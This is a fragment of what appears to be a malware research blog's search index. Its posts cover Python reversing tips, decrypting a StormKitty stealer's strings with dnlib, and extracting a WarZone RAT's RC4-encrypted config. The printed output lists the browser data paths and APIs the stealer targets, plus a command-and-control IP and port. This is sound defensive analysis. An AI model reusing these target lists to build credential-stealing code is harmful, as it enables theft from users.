{string_length}&#39;) print(f&#39;string: {strings}&#39;, end=&quot; n n&quot;) # Tip 6.1 - Using lambda bstream.seek(0,0) # beginning of the stream read_byte = lambda bs: bs.read(1)[0] read_dword = lambda bs: struct.unpack(&quot;&lt;I&quot;, bs.read(4))[0] read_utf16le = lambda bs, s: bs.read(s).decode(&quot;utf-16le&quot;) read_utf8 = lambda bs, s: bs.read(s).decode(&quot;utf-8&quot;) print(f&#39;is_wide_string: {read_byte(bstream)}&#39;) print(f&#39;string_length: {read_dword(bstream)}&#39;) if is_wide_string: print(f&#39;string: {read_utf16le(bstream, string_length)}&#39;) else : print(f&#39;string: {read_utf8(bstream, string_length)}&#39;) . is_wide_string: False string_length: 4 string: test is_wide_string: 0 string_length: 4 string: test . Tip 7 - Using Fundamental Data Types With ctypes . e.g., useful to reimplement C pseudo code algorithm in Python . Highly recommended to read ctypes doc for reverser https://docs.python.org/3/library/ctypes.html . print(&quot;WRONG :&quot;) DWORD = 0xFFFFFFFF print(f&quot;DWORD = {hex(DWORD)}&quot;) DWORD += 1 print(f&quot;DWORD+1 = {hex(DWORD)} ; WRONG! DWORD size is 4 bytes&quot;) DWORD = 0x0 print(f&quot;DWORD = {hex(DWORD)}&quot;) DWORD -= 1 print(f&quot;DWORD-1 = {hex(DWORD)} ; HUM ?!&quot;, end=&quot; n n&quot;) import ctypes print(&quot;GOOD :&quot;) DWORD = ctypes.c_uint32(0xFFFFFFFF) print(f&quot;DWORD = {hex(DWORD.value)}&quot;) DWORD.value += 1 print(f&quot;DWORD+1 = {hex(DWORD.value)} ; GOOD!&quot;) DWORD = ctypes.c_uint32(0x0) print(f&quot;DWORD = {hex(DWORD.value)}&quot;) DWORD.value -= 1 print(f&quot;DWORD-1 = {hex(DWORD.value)}&quot;, end=&quot; n n&quot;) # CAST DATA EAX = ctypes.c_uint32(0xAAAABBBB) AX = ctypes.cast(ctypes.addressof(EAX), ctypes.POINTER(ctypes.c_uint16)) # we can cast print(&quot;EAX =&quot;, hex(EAX.value)) print(&quot;AX =&quot;, hex(AX.contents.value)) . WRONG : DWORD = 0xffffffff DWORD+1 = 0x100000000 ; WRONG! DWORD size is 4 bytes DWORD = 0x0 DWORD-1 = -0x1 ; HUM ?! GOOD : DWORD = 0xffffffff DWORD+1 = 0x0 ; GOOD! DWORD = 0x0 DWORD-1 = 0xffffffff EAX = 0xaaaabbbb AX = 0xbbbb . Tip 8 - Parse Binary Data Straight To Python Structure . e.g, we are parsing UNICODE_STRING C structure (from WinAPI) : . typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, *PUNICODE_STRING; . from ctypes import Structure from ctypes import wintypes import io class UNICODE_STRING(Structure): _fields_ = [ (&#39;Length&#39;, wintypes.USHORT), (&#39;MaximumLength&#39;, wintypes.USHORT), (&#39;Buffer&#39;, wintypes.WCHAR*1024) # No more 1024 wchar! If more =&gt; CRASH # To keep the example more concise we are not manage the Buffer length ] # UNICODE_STRING data extracted from memory/raw file data = b&#39; x0F x00 x11 x00 x48 x00 x65 x00 x6c x00 x6c x00 x6f x00 x20 x00 x74 x00 x68 x00 x65 x00 x20 x00 x77 x00 x6f x00 x72 x00 x6c x00 x64 x00 x00 x00 x00 x00&#39; stream = io.BytesIO(data) unicode_stru = UNICODE_STRING() stream.readinto(unicode_stru) # deserialization bin to struct print(f&quot;L:{unicode_stru.Length} Max:{unicode_stru.MaximumLength} Str:{unicode_stru.Buffer}&quot;) . L:15 Max:17 Str:Hello the world . Tip 9 - Call C Function from DLL . e.g., we want to analyze the return of GetLogicalDriveStringsW . DWORD GetLogicalDriveStringsW( DWORD nBufferLength, LPWSTR lpBuffer ); . from ctypes import wintypes, windll, byref length = windll.kernel32.GetLogicalDriveStringsW(0,0) # total length required data_string = (wintypes.CHAR*(length*2))() # array of char to access in raw format windll.kernel32.GetLogicalDriveStringsW(length, byref(data_string)) # call api print(&quot;raw: &quot; + str(data_string.raw)) for drive in data_string.raw.rsplit(b&#39; x00 x00&#39;): print(drive.decode(&quot;utf-16le&quot;)) . raw: b&#39;C x00: x00 x00 x00 x00E x00: x00 x00 x00 x00F x00: x00 x00 x00 x00 x00 x00&#39; C: E: F: .",
            "url": "https://research.openanalysis.net/python/python3/tips/research/2021/07/26/python3_reversing_tips.html",
            "relUrl": "/python/python3/tips/research/2021/07/26/python3_reversing_tips.html",
            "date": " ‚Ä¢ Jul 26, 2021"
        }
        
    
  
    
        ,"post77": {
            "title": "Dot NET Static Analysis With Python",
            "content": "Overview . References: . https://github.com/0ffsetTrainingSolutions/MOLERATS/blob/main/StringDecrypt/reactor_decrypt.py | https://pypi.org/project/pythonnet/ | https://github.com/XenocodeRCE/ConfuserEx-Unpacker | https://rhotav.github.io/stringdecryptionwithpythonen | . StormKitty String Decryption . We need a simple task to test our tools and a .NET sample. Let&#39;s try to decrypt the strings from this modified StormKitty stealer (https://github.com/swagkarna/StormKitty). You can download the sample from malshare (https://malshare.com/sample.php?action=detail&amp;hash=16694f6390c59adc1161a1855e9e7904). . If we load the sample in dnspy we can see that there is an AES deryption function that reads a hard coded password and salt that are passed to the generator Rfc2898DeriveBytes and used to generate a key and IV which are then used these to decrypt strings on the fly. . . . To start out simple lets conver the decryption routine into python, then lets use dnlib to parse out all the decryption calls and decrypt the strings. . from Crypto.Cipher import AES def decrypt(ctxt, key, iv): cipher = AES.new(key, AES.MODE_CBC, iv) return cipher.decrypt(ctxt) # Test with data from dnspy salt = bytes([0xff,64,191,111,23,3,113,119,231,121,252,112,79,32,114,156]) password = bytes([104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,76,105,109,101,114,66,111,121,47,83,116,111,114,109,75,105,116,116,121]) iter_count = 1000 key_size = 256 block_size = 128 key_size_bytes = int(key_size/8) block_size_bytes = int(block_size/8) # Generate the key and IV from the hard coded password and salt # Rfc2898DeriveBytes is a streaming-response object, # so concatenating two successive calls is the same as # doing one call with both lengths added together from Crypto.Protocol import KDF key_bytes = KDF.PBKDF2(password, salt, count=iter_count, dkLen=key_size_bytes+block_size_bytes) ctxt = bytes([191,144,50,4,176,103,41,226,163,145,184,198,37,147,201,246,15,80,188,217,224,55,94,195,60,36,195,150,34,219,225,21]) ptxt = decrypt(ctxt, key_bytes[:key_size_bytes], key_bytes[key_size_bytes:]) print(&quot;Decrypted string: %r&quot; % ptxt) . Decrypted string: b&#39; Chromium User Data x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c&#39; . # The padding byte is the pad delta so we just have to take a byte # and use it to clip the delta off the end of the data def unpad(data): return data[:-ord(data[len(data)-1:])] print(&quot;Decrypted string: %r&quot; % unpad(ptxt)) . Decrypted string: b&#39; Chromium User Data &#39; . .NET Assembly Analysis . Ok now that we have a decryption routine we can start to look at programmatically analyzing the .NET assembly seaching for the encrypted strings. . First we will need a way to call .NET methods from Python. This will allow us to both execute functionality in the sample as well as take advantage of multiple .NET analysis tools which are themselves written in .NET. For this we will use the pythonnet package (https://github.com/pythonnet/pythonnet/wiki). . Pythonnet Setup . Installing pythonnet is as simple as pip install pythonnet. If you are on mac you will want to first make sure you have mono installed. Mono is the platfrom independent .NET interpreter that allows you to run .NET anywhere. We will use brew with brew install mono. . Once we have pythonnet installed it can be imported into python using import clr. CLR stands for Common Language Runtime which is the actual virtual machine that is used to interpret and execute .NET (I think?). . import sys, struct, clr clr.AddReference(&quot;System.Memory&quot;) from System.Reflection import Assembly, MethodInfo, BindingFlags from System import Type . We are going to use dnlib (https://github.com/0xd4d/dnlib) to interact wiht the .NET assembly. We will need to download the DLL and pass a local path to our python instance. We can build our own from the release ((https://github.com/0xd4d/dnlib/releases) or just download an old compiled version (https://github.com/XenocodeRCE/ConfuserEx-Unpacker/tree/master/DLLS). . DNLIB_PATH = &#39;/tmp/dnlib.dll&#39; clr.AddReference(DNLIB_PATH) import dnlib from dnlib.DotNet import * from dnlib.DotNet.Emit import OpCodes . Like the dnlib DLL we will need to pass the local path to this file to our Python. Then we can use this path to load the .NET module and assembly. . SAMPLE_PATH = &#39;/tmp/6e4802a21c61d349b2a201ec5143e095b57e033d51bb571b90a53749956beac4.bin&#39; module = dnlib.DotNet.ModuleDefMD.Load(SAMPLE_PATH) # we don&#39;t need the assembly for this because we won&#39;t be using invoke # assembly = Assembly.LoadFrom(SAMPLE_PATH) . Now we need to find the decryption method. The process is straight forward, we will iterate through all of the methods for each type in the module (I think type is what a class is converted to in the IL?) and for each method we will check the instructions to find the decryption method. Actually matching the decryption method is a bit of a hack but basically we just find some stuff that is probably unique to the method and search for that. In this case we are looking for instructions that set the AES key size SymmetricAlgorithm::set_KeySize and block size SymmetricAlgorithm::set_BlockSize. . . eFlags = BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic # First find the decryption method decryption_method = None for mtype in module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: if not method.HasBody: continue if not method.Body.HasInstructions: continue if len(method.Body.Instructions) &lt; 20: continue # Check the first 20 instructions for the AES key set and block set key_set = False block_set = False for ptr in range(20): if &#39;SymmetricAlgorithm::set_KeySize&#39; in method.Body.Instructions[ptr].ToString(): key_set = True if &#39;SymmetricAlgorithm::set_BlockSize&#39; in method.Body.Instructions[ptr].ToString(): block_set = True if key_set and block_set: decryption_method = method break if decryption_method != None: print(decryption_method.FullName) else: print(&quot;Can&#39;t find decryption method!&quot;) . System.String Class69::smethod_1(System.Byte[]) . Now that we know the decryption method we can save its name then we can search for calls to the method name. The actual name is a bit tricky since we want the class name and the method name in order to disambiguate it. The class name will always preceed the method name with :: so we can use that to parse the correct string. . full_name = decryption_method.FullName method_name = str(decryption_method.Name) decryption_method_name = full_name[:full_name.find(method_name)+len(method_name)].split(&quot; &quot;)[-1] . Now we can find all the places where the decryption method is called by searching through all the instructions for a call to the decryption method name. . Once we find a call we need to parse out the arguement which is an array containing the encrypted string. This is is a bit tricky since arrays are split into multiple instructions in the IL. . . Here we can see the call to the decryption method on line 291 and preceeding the call we can see another call to InitializeArray which takes an argument setup with the ldtoken call on line 295. Based on this we can search backwards in the code from the call to the decryption fucntion for the first ldtoken instruction which will be loadin the actual data for the array (containing the encrypted string). . for mtype in module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: if not method.HasBody: continue if not method.Body.HasInstructions: continue for ptr in range(len(method.Body.Instructions)): instruction = method.Body.Instructions[ptr] if instruction.OpCode == OpCodes.Call: if decryption_method_name in instruction.ToString(): # Found call now seach backwards a maximum of 5 instructions for ldtoken to get encrypted string for i in range(1,5): if method.Body.Instructions[ptr-i].OpCode == OpCodes.Ldtoken: print(method.Body.Instructions[ptr-i]) mm = method.Body.Instructions[ptr-i] token = mm.Operand.MDToken . IL_0011: ldtoken Class71/Struct20 Class71::struct20_6 IL_002B: ldtoken Class71/Struct20 Class71::struct20_14 IL_0045: ldtoken Class71/Struct20 Class71::struct20_19 IL_005F: ldtoken Class71/Struct20 Class71::struct20_2 IL_0079: ldtoken Class71/Struct22 Class71::struct22_0 IL_0093: ldtoken Class71/Struct20 Class71::struct20_4 IL_00AD: ldtoken Class71/Struct20 Class71::struct20_3 IL_00C7: ldtoken Class71/Struct20 Class71::A25CC6D70519A408CEA3AE72EBFF915335C6E6E613B18720FA746D0D8056559B IL_00E1: ldtoken Class71/Struct20 Class71::struct20_18 IL_00FC: ldtoken Class71/Struct20 Class71::struct20_9 IL_0117: ldtoken Class71/Struct20 Class71::struct20_24 IL_0132: ldtoken Class71/Struct20 Class71::struct20_25 IL_014D: ldtoken Class71/Struct20 Class71::BF8CAA158736480861E8F91826FFFA6545B27C3EC30153CA68330811329C2A8E IL_0168: ldtoken Class71/Struct20 Class71::struct20_22 IL_0183: ldtoken Class71/Struct23 Class71::struct23_1 IL_019E: ldtoken Class71/Struct22 Class71::ACDCB1AFB15194F894860BA7E2B85B91B6E5AB701407DFBAC51146F0C6E53B6F IL_01B9: ldtoken Class71/Struct20 Class71::struct20_21 IL_01D4: ldtoken Class71/Struct20 Class71::CE8979E74A40B6869BD5BED7E5610AA981486221166D6F6E65F3B34BF501B8DD IL_01EF: ldtoken Class71/Struct20 Class71::struct20_8 IL_020A: ldtoken Class71/Struct20 Class71::struct20_10 IL_0225: ldtoken Class71/Struct20 Class71::struct20_7 IL_0240: ldtoken Class71/Struct20 Class71::struct20_20 IL_025B: ldtoken Class71/Struct20 Class71::struct20_15 IL_0276: ldtoken Class71/Struct22 Class71::struct22_2 IL_0291: ldtoken Class71/Struct20 Class71::struct20_13 IL_02AC: ldtoken Class71/Struct20 Class71::A223DB41D9BFBC0280EBD0050A8BBD8EA7A943B251C8FD2D0B01A040462EDB0B IL_02C7: ldtoken Class71/Struct20 Class71::struct20_12 IL_02E2: ldtoken Class71/Struct20 Class71::struct20_23 IL_02FD: ldtoken Class71/Struct20 Class71::ACDF4A22C9359C1328E1CC966BC6C0D0D95B468AF46466FFAEC92C411050E17B IL_0318: ldtoken Class71/Struct20 Class71::A515425C81DC183149AF8B446E168A9509399B54129E92DAC27E19364B0D7B86 IL_0333: ldtoken Class71/Struct20 Class71::D3709EF761A0DEFC0ABE47CF9B3476718CE15F873291CF43E1AE3DC080DE5523 IL_034E: ldtoken Class71/Struct20 Class71::A981F5EDD35DDFF3F41F44A598272BBEAFA5F5B9C1595DC02FC6044CE81BE666 IL_0369: ldtoken Class71/Struct20 Class71::struct20_11 IL_0384: ldtoken Class71/Struct20 Class71::struct20_1 IL_039F: ldtoken Class71/Struct22 Class71::FD2AD7331099CFB7A118458E12965559ABF6D870A4B3DFF975FF43C3C56C09C8 IL_03C4: ldtoken Class71/Struct20 Class71::struct20_17 IL_03DE: ldtoken Class71/Struct19 Class71::struct19_0 IL_03F8: ldtoken Class71/Struct19 Class71::CEB1CC71FC33A5B2E3A8E0727D334A0B236251779D5BAF438C965B4FB341F460 IL_0412: ldtoken Class71/Struct19 Class71::A4956ED9AA7996A00C7593BFFCBDB3FBE5A11F729876DF9AC5A1A33EF3EFE3A2 IL_042C: ldtoken Class71/Struct20 Class71::A8F810D24584EC3B7929D304606C2DD1E44F852CA90C291ED8CC398AA3F07FD3 IL_0446: ldtoken Class71/Struct20 Class71::D170DC7768D26A111EF0E7B910988BFC4ACBCA3BE6A5B476EED1F48C70040F93 IL_0460: ldtoken Class71/Struct20 Class71::D61B7716B5AD4A42CC6C9300587B2C389EB40C3E8BF9B039E7DB98097247DC1B IL_047A: ldtoken Class71/Struct22 Class71::CAB1D35DDB8E2426F9750F1040D87B301146E2BFAB7CF292C14EC1133A2ACB37 IL_0497: ldtoken Class71/Struct20 Class71::struct20_0 IL_002D: ldtoken Class71/Struct23 Class71::B6BF689EB1506173FB29643B5E51D7E067FD5E191256B038EB618C2F593EB272 IL_00A8: ldtoken Class71/Struct20 Class71::struct20_16 IL_011B: ldtoken Class71/Struct20 Class71::D813E22A9B121801B05222D1BF9E349DAA549C1171C61A538CAD559E2701513B IL_01FB: ldtoken Class71/Struct23 Class71::struct23_2 IL_0302: ldtoken Class71/Struct23 Class71::A4327AC8803761C49FE829B97D8B2E262D38A165E20B7F7C9FDCD1F757CDB7BB IL_0092: ldtoken Class71/Struct20 Class71::struct20_5 IL_000E: ldtoken Class71/Struct20 Class71::B4066645CC9D38B322DDCD501F7863D2759D4CAA2A993694DCC6DDB1EEBC7301 IL_002E: ldtoken Class71/Struct23 Class71::struct23_0 IL_01C1: ldtoken Class71/Struct22 Class71::struct22_1 IL_0008: ldtoken Class71/Struct20 Class71::B28DB940EDE70686E870504AE41CB6EEAE634B9858DF6B5AEAB3958AA115A5E1 . Now that we have a way to find all of the arrays that contain the encrypted strings we need a way to get the data out of the array. This was very confusing when I was trying to figure it out... hat tip to https://twitter.com/s4tan for all the help &lt;3 . http://antonioparata.blogspot.com/2018/02/analyzing-nasty-net-protection-of.html | http://antonioparata.blogspot.com/2013/10/blog-post.html | . I&#39;m still not sure this is the best way to do things but basically we grab the first operand from the ldtoken instruction which is the token for the field that contains the array. Each array is stored in a field in a class so once we have the token we can search through all the fields in all the classes for the matching token and extract the data. To actually convert the byte array into something we can use in Python we call the get_InitialValue method for the field and convert this into a byte string. I think this works because the array is static making the initial value the actual value but I&#39;m not entirely sure. . To simplify the process I created a helper function that will allow us to find and extract the bytes string based on a token. . def get_array_data_by_token(token): for mtype in module.GetTypes(): if mtype.get_HasFields(): for field in mtype.get_Fields(): if field.get_MDToken() == token: try: return bytes(field.get_InitialValue()) except: return None return None . Now we have all the parts and we can put them together to extract and decrypt the strings! . for mtype in module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: if not method.HasBody: continue if not method.Body.HasInstructions: continue for ptr in range(len(method.Body.Instructions)): instruction = method.Body.Instructions[ptr] if instruction.OpCode == OpCodes.Call: if decryption_method_name in instruction.ToString(): # Found call now seach backwards a maximum of 5 instructions for ldtoken to get encrypted string for i in range(1,5): if method.Body.Instructions[ptr-i].OpCode == OpCodes.Ldtoken: mm = method.Body.Instructions[ptr-i] token = mm.Operand.MDToken ctxt = get_array_data_by_token(token) if ctxt != None: ptxt = decrypt(ctxt, key_bytes[:key_size_bytes], key_bytes[key_size_bytes:]) ptxt = unpad(ptxt) print(ptxt) else: print(&quot;Error no array data found for %s&quot; % method.Body.Instructions[ptr-i]) . b&#39; Chromium User Data &#39; b&#39; Google Chrome User Data &#39; b&#39; Google(x86) Chrome User Data &#39; b&#39; Opera Software &#39; b&#39; MapleStudio ChromePlus User Data &#39; b&#39; Iridium User Data &#39; b&#39; 7Star 7Star User Data &#39; b&#39; CentBrowser User Data &#39; b&#39; Chedot User Data &#39; b&#39; Vivaldi User Data &#39; b&#39; Kometa User Data &#39; b&#39; Elements Browser User Data &#39; b&#39; Epic Privacy Browser User Data&#39; b&#39; uCozMedia Uran User Data &#39; b&#39; Fenrir Inc Sleipnir5 setting modules ChromiumViewer &#39; b&#39; CatalinaGroup Citrio User Data &#39; b&#39; Coowon Coowon User Data &#39; b&#39; liebao User Data &#39; b&#39; QIP Surf User Data &#39; b&#39; Orbitum User Data &#39; b&#39; Comodo Dragon User Data &#39; b&#39; Amigo User User Data &#39; b&#39; Torch User Data &#39; b&#39; Yandex YandexBrowser User Data &#39; b&#39; Comodo User Data &#39; b&#39; 360Browser Browser User Data &#39; b&#39; Maxthon3 User Data &#39; b&#39; K-Melon User Data &#39; b&#39; Sputnik Sputnik User Data &#39; b&#39; Nichrome User Data &#39; b&#39; CocCoc Browser User Data &#39; b&#39; Uran User Data &#39; b&#39; Chromodo User Data &#39; b&#39; Mail.Ru Atom User Data &#39; b&#39; BraveSoftware Brave-Browser User Data &#39; b&#39; Mozilla Firefox&#39; b&#39; Waterfox&#39; b&#39; K-Meleon&#39; b&#39; Thunderbird&#39; b&#39; Comodo IceDragon&#39; b&#39; 8pecxstudios Cyberfox&#39; b&#39; NETGATE Technologies BlackHaw&#39; b&#39; Moonchild Productions Pale Moon&#39; b&#39; Microsoft Edge User Data&#39; b&#39;https://studio.youtube.com/getAccountSwitcherEndpoint&#39; b&#39;https://www.youtube.com&#39; b&#39;https://studio.youtube.com&#39; b&#39;https://studio.youtube.com/youtubei/v1/att/get?alt=json&amp;key=&#39; b&#39;https://studio.youtube.com/youtubei/v1/att/esr?alt=json&amp;key=&#39; b&#39;vm7UdYrfFAJ7GRZxN8S9&#39; b&#39;http://api64.ipify.org&#39; b&#39;https://api.mylnikov.org/geolocation/wifi?v=1.1&amp;bssid=&#39; b&#39;https://www.google.com.ua/maps/place/&#39; b&#39;https://api.telegram.org/bot&#39; . Editing .NET Assembly . Success! Now that we have our string decryption working we can update our code to edit the sample and insert the decrypted strings. This process is is made very easy using dnlib. All we need to do is nop out the instructions that are used to build the encrypted string array and replace the call to the decryption function with a simple string load using the decrypted string. Since the instruction following decryption call expects the decrypted string to be on the stack we will load the decrypted string directly on the stack. Once this is done we will save the edited assembly to a new file. . . for mtype in module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: if not method.HasBody: continue if not method.Body.HasInstructions: continue for ptr in range(len(method.Body.Instructions)): instruction = method.Body.Instructions[ptr] if instruction.OpCode == OpCodes.Call: if decryption_method_name in instruction.ToString(): # Found call now seach backwards a maximum of 5 instructions for ldtoken to get encrypted string for i in range(1,5): if method.Body.Instructions[ptr-i].OpCode == OpCodes.Ldtoken: mm = method.Body.Instructions[ptr-i] token = mm.Operand.MDToken ctxt = get_array_data_by_token(token) if ctxt != None: ptxt = decrypt(ctxt, key_bytes[:key_size_bytes], key_bytes[key_size_bytes:]) ptxt = unpad(ptxt) print(ptxt) # We need to nop out everything from OpCodes.Ldc_I4_S to the decryption call for j in range(1,10): if method.Body.Instructions[ptr-j].OpCode == OpCodes.Ldc_I4_S: while j &gt; 0: method.Body.Instructions[ptr-j].OpCode = OpCodes.Nop j -= 1 break # Replace decryption call with string load method.Body.Instructions[ptr].OpCode = OpCodes.Ldstr method.Body.Instructions[ptr].Operand = ptxt.decode(&#39;utf-8&#39;) else: print(&quot;Error no array data found for %s&quot; % method.Body.Instructions[ptr-i]) # we found the string no need to keep searching for instructions break # To avoid the Error calculating max stack value we can just keep old max stack method.Body.KeepOldMaxStack = True # Save edited assembly module.Write(SAMPLE_PATH + &quot;.decrypted&quot;) . b&#39; Chromium User Data &#39; b&#39; Google Chrome User Data &#39; b&#39; Google(x86) Chrome User Data &#39; b&#39; Opera Software &#39; b&#39; MapleStudio ChromePlus User Data &#39; b&#39; Iridium User Data &#39; b&#39; 7Star 7Star User Data &#39; b&#39; CentBrowser User Data &#39; b&#39; Chedot User Data &#39; b&#39; Vivaldi User Data &#39; b&#39; Kometa User Data &#39; b&#39; Elements Browser User Data &#39; b&#39; Epic Privacy Browser User Data&#39; b&#39; uCozMedia Uran User Data &#39; b&#39; Fenrir Inc Sleipnir5 setting modules ChromiumViewer &#39; b&#39; CatalinaGroup Citrio User Data &#39; b&#39; Coowon Coowon User Data &#39; b&#39; liebao User Data &#39; b&#39; QIP Surf User Data &#39; b&#39; Orbitum User Data &#39; b&#39; Comodo Dragon User Data &#39; b&#39; Amigo User User Data &#39; b&#39; Torch User Data &#39; b&#39; Yandex YandexBrowser User Data &#39; b&#39; Comodo User Data &#39; b&#39; 360Browser Browser User Data &#39; b&#39; Maxthon3 User Data &#39; b&#39; K-Melon User Data &#39; b&#39; Sputnik Sputnik User Data &#39; b&#39; Nichrome User Data &#39; b&#39; CocCoc Browser User Data &#39; b&#39; Uran User Data &#39; b&#39; Chromodo User Data &#39; b&#39; Mail.Ru Atom User Data &#39; b&#39; BraveSoftware Brave-Browser User Data &#39; b&#39; Mozilla Firefox&#39; b&#39; Waterfox&#39; b&#39; K-Meleon&#39; b&#39; Thunderbird&#39; b&#39; Comodo IceDragon&#39; b&#39; 8pecxstudios Cyberfox&#39; b&#39; NETGATE Technologies BlackHaw&#39; b&#39; Moonchild Productions Pale Moon&#39; b&#39; Microsoft Edge User Data&#39; b&#39;https://studio.youtube.com/getAccountSwitcherEndpoint&#39; b&#39;https://www.youtube.com&#39; b&#39;https://studio.youtube.com&#39; b&#39;https://studio.youtube.com/youtubei/v1/att/get?alt=json&amp;key=&#39; b&#39;https://studio.youtube.com/youtubei/v1/att/esr?alt=json&amp;key=&#39; b&#39;vm7UdYrfFAJ7GRZxN8S9&#39; b&#39;http://api64.ipify.org&#39; b&#39;https://api.mylnikov.org/geolocation/wifi?v=1.1&amp;bssid=&#39; b&#39;https://www.google.com.ua/maps/place/&#39; b&#39;https://api.telegram.org/bot&#39; .",
            "url": "https://research.openanalysis.net/dot%20net/static%20analysis/stormkitty/dnlib/python/research/2021/07/14/dot_net_static_analysis.html",
            "relUrl": "/dot%20net/static%20analysis/stormkitty/dnlib/python/research/2021/07/14/dot_net_static_analysis.html",
            "date": " ‚Ä¢ Jul 14, 2021"
        }
        
    
  
    
        ,"post78": {
            "title": "Python3 Tips and Sample Code",
            "content": "Overview . Python2.7 is like second nature to me now and I keep getting hung up on the idiotic typing that Python3 has introduced. Hopefully these examples will help. . Binary Data and Hex Ecoding . import binascii string_example = &quot;test&quot; byte_array_example = b&quot;test&quot; # Convert string into bytes print(string_example.encode(&#39;utf-8&#39;)) # Convert byte array into string print(byte_array_example.decode(&#39;utf-8&#39;)) # Convert string into hex encoded byte array print(binascii.hexlify(string_example.encode(&#39;utf-8&#39;))) # Convert byte array into hex encoded byte array print(binascii.hexlify(byte_array_example)) # Convert byte array into hex encoded string print(binascii.hexlify(byte_array_example).decode(&#39;utf-8&#39;)) # Convert hex encoded byte array into ascii byte array hex_byte_array = b&#39;74657374&#39; print(binascii.unhexlify(hex_byte_array)) # Convert hex encoded string into ascii byte array hex_string = &#39;74657374&#39; print(binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;))) # Convert hex encoded string into ascii string hex_string = &#39;74657374&#39; print(binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)) . b&#39;test&#39; test b&#39;74657374&#39; b&#39;74657374&#39; 74657374 b&#39;test&#39; b&#39;test&#39; test . Hex Encoding Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Strings Functions . def unicode_strings(buf, n=4): import re ASCII_BYTE = b&#39; ! &quot;# $%&amp; &#39; ( ) * +,- ./0123456789:;&lt;=&gt; ?@ABCDEFGHIJKLMNOPQRSTUVWXYZ [ ] ^_`abcdefghijklmnopqrstuvwxyz { | } ~ t&#39; if type(buf) == str: buf = buf.encode(&#39;utf-8&#39;) reg = b&#39;((?:[%s] x00){%d,})&#39; % (ASCII_BYTE, n) uni_re = re.compile(reg) out = [] for match in uni_re.finditer(buf): try: out.append(match.group().decode(&quot;utf-16&quot;)) except UnicodeDecodeError: pass return out def ascii_strings(buf, n=4): import re ASCII_BYTE = b&#39; ! &quot;# $%&amp; &#39; ( ) * +,- ./0123456789:;&lt;=&gt; ?@ABCDEFGHIJKLMNOPQRSTUVWXYZ [ ] ^_`abcdefghijklmnopqrstuvwxyz { | } ~ t&#39; if type(buf) == str: buf = buf.encode(&#39;utf-8&#39;) reg = b&#39;([%s]{%d,})&#39; % (ASCII_BYTE, n) ascii_re = re.compile(reg) out = [] for match in ascii_re.finditer(buf): try: out.append(match.group().decode(&quot;ascii&quot;)) except UnicodeDecodeError: pass return out . test_var = &quot;test&quot; print(test_var) . test .",
            "url": "https://research.openanalysis.net/python/python3/tips/research/2021/06/27/python3_examples.html",
            "relUrl": "/python/python3/tips/research/2021/06/27/python3_examples.html",
            "date": " ‚Ä¢ Jun 27, 2021"
        }
        
    
  
    
        ,"post79": {
            "title": "WarZone RAT",
            "content": "Overview . The config is stored in the .bss PE section with the following format. . Key length | key | data . import argparse import struct import pefile import re import binascii . Now a quick reminder ddof binary data hex encoding for Python3 . RC4 Encryption . The data is encrypted using RC4. For more information on RC4 check out our RC4 tutorial video. . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . Helper functions . import binascii data = binascii.unhexlify(b&#39;&#39;) key = binascii.unhexlify(b&#39;&#39;) def unicode_strings(buf, n=4): import re ASCII_BYTE = b&#39; ! &quot;# $%&amp; &#39; ( ) * +,- ./0123456789:;&lt;=&gt; ?@ABCDEFGHIJKLMNOPQRSTUVWXYZ [ ] ^_`abcdefghijklmnopqrstuvwxyz { | } ~ t&#39; if type(buf) == str: buf = buf.encode(&#39;utf-8&#39;) reg = b&#39;((?:[%s] x00){%d,})&#39; % (ASCII_BYTE, n) uni_re = re.compile(reg) out = [] for match in uni_re.finditer(buf): try: out.append(match.group().decode(&quot;utf-16&quot;)) except UnicodeDecodeError: continue return out def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . import pefile import struct warzone_file = b&#39;/tmp/work/warzone.bin&#39; data = open(warzone_file, &#39;rb&#39;).read() pe = pefile.PE(data=data) section_data = None for s in pe.sections: if s.Name == b&#39;.bss x00 x00 x00 x00&#39;: section_data = s.get_data() ## size (DWORD) | key | data key_size = struct.unpack(&#39;&lt;I&#39;, section_data[:4])[0] key = section_data[4:4 + key_size] ctxt = section_data[4+key_size:] ctxt = ctxt.split(b&#39; x00 x00 x00 x00 x00 x00 x00 x00&#39;)[0] ptxt = rc4crypt(ctxt, key) host_len = struct.unpack(&#39;&lt;I&#39;, ptxt[:4])[0] host_wide = ptxt[4:host_len+4] c2_host = unicode_strings(host_wide)[0] c2_port = struct.unpack(&#39;&lt;H&#39;, ptxt[host_len+4:host_len+4+2])[0] print(&quot;host: %s, port: %d&quot; % (c2_host, c2_port)) . host: 165.22.5.66, port: 1111 .",
            "url": "https://research.openanalysis.net/warzone/malware/config/2021/05/31/warzone_rat_config.html",
            "relUrl": "/warzone/malware/config/2021/05/31/warzone_rat_config.html",
            "date": " ‚Ä¢ May 31, 2021"
        }
        
    
  

  
  

  

  
  

  
  

  

  
  

  
  

  

  

  

  

  

  
  

  
      ,"page13": {
          "title": "",
          "content": "Sitemap: {{ ‚Äúsitemap.xml‚Äù | absolute_url }} | .",
          "url": "https://research.openanalysis.net/robots.txt",
          "relUrl": "/robots.txt",
